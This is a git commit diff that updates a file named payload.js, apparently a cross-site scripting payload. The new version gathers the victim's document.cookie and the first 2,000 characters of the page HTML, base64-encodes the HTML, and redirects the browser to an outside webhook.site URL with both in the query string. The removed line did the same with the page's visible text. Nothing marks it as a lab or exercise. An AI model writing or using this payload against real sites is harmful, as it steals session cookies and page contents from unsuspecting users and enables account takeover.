755c08b6f7b77983777389e919f5e0f764fdafa0
Francisco <francisco.digiandomenico@gmail.com>
2025-06-24 20:02:58 -0400

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,1 +1,8 @@
-window.location = 'https://webhook.site/67a2bff1-4944-491d-9e41-5da1bbc8c1f9?d=' + encodeURIComponent(document.body.innerText);
+const grab = {
+  c : document.cookie       || 'nocookie',
+  h : btoa(unescape(encodeURIComponent(
+        document.documentElement.outerHTML.slice(0,2000)
+      )))
+};
+const q = new URLSearchParams(grab).toString();
+window.location = 'https://webhook.site/67a2bff1-4944-491d-9e41-5da1bbc8c1f9?' + q;
